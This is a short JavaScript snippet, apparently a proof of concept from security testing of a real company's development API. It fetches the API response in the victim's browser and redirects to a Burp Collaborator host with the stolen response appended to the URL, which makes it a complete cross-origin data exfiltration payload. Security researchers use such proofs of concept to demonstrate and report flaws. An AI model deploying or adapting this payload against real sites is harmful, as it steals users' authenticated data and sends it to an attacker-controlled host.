url = "https://apidev.theminted.com/api/";
function httpGet(url)
{
		var xmlHttp = new XMLHttpRequest();
		xmlHttp.open("GET", url, false);
		xmlHttp.send(null);
		return xmlHttp.responseText;

}
var all = httpGet(url);
document.location='https://azdhzx4wvnfqieu2i15vgwvg2781wq.burpcollaborator.net/data.php?c='+all;